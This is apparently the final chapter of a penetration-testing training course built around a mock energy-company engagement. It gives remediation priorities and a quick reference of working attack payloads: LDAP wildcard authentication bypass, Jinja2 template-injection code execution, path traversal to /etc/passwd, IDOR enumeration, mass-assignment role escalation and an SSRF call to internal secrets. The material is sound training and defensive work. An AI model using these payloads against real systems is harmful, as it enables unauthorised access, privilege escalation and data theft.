    Remediation Priorities

    Based on the full engagement, the following remediation priorities address the highest-impact vulnerabilities first:

    Critical (Fix Immediately)

    Finding Fix Systems Affected
    SSTI in Report Generator Pass user input as template variables, deploy SandboxedEnvironment Admin Portal
    SSRF in Monitoring API URL allowlisting, egress filtering Monitoring API
    Path traversal on file server Canonicalize paths, verify document root prefix File Server

    High (Fix Within 1 Week)

    Finding Fix Systems Affected
    LDAP injection Switch to bind authentication, escape input Admin Portal, LDAP Server
    Mass assignment Server-side field allowlisting on all endpoints Monitoring API
    IDOR on alerts Authorization checks on every resource access Monitoring API
    Credentials in env vars Deploy secrets manager (Vault) Admin Portal

    Medium (Fix Within 1 Month)

    Finding Fix Systems Affected
    No network segmentation Separate IT, OT, and DMZ zones with firewall rules All systems
    No WAF Deploy WAF in front of all web applications All web apps
    No monitoring Deploy SIEM with detection rules for injection, traversal, SSRF All systems
    Weak credential policy Enforce MFA, password complexity, rotation All accounts

    Technique Quick Reference

    LDAP Injection

    # Wildcard bypass
Username: s.chen
Password: *

# Filter produced
(&(uid=s.chen)(userPassword=*))

# Prevention: Use ldap_bind() instead of search filters

    SSTI (Jinja2)

    # Detection
{{7*7}}                      -> 49
{{7*'7'}}                    -> 7777777

# Information gathering
{{config.items()}}           -> App configuration
{{request.environ}}          -> WSGI environment

# RCE
{{cycler.__init__.__globals__.os.popen('COMMAND').read()}}

# Prevention: Never compile user input as template code

    Path Traversal

    # Basic traversal
/download?file=../../../etc/passwd

# URL-encoded
/download?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Prevention: Canonicalize and verify path prefix

    API Exploitation Chain

    # IDOR enumeration
for i in $(seq 1 100); do curl -H "Auth: Bearer $T" /api/alerts/$i; done

# Mass assignment
curl -X PUT -d '{"name":"User","role":"admin"}' /api/user/profile

# SSRF
curl -X POST -d '{"url":"http://internal:5000/secrets"}' /api/admin/fetch

# Prevention: Authorization checks, field allowlists, URL validation

    What Comes Next

    The Meridian Energy engagement covered the most common vulnerability classes in corporate and OT-adjacent environments. To continue building skills:

    • Practice LDAP injection on deliberately vulnerable applications (DVWA, WebGoat, Juice Shop)
    • Study SSTI across multiple template engines (Jinja2, Twig, Freemarker, Velocity) using the PayloadsAllTheThings repository
    • Explore OT security through ICS-CERT advisories and SANS ICS courses to understand real-world SCADA vulnerabilities
    • Build detection rules for the techniques used in this engagement: write Suricata or Snort rules for path traversal, SSTI payloads, and LDAP injection patterns
    • Review the MITRE ATT&CK for ICS framework which maps industrial control system attack techniques separately from enterprise IT techniques

    The skills developed across the four Meridian Energy chapters, including reconnaissance, web exploitation, infrastructure attacks, and multi-phase attack chaining, apply directly to real-world penetration testing engagements in the energy, utilities, and critical infrastructure sectors.
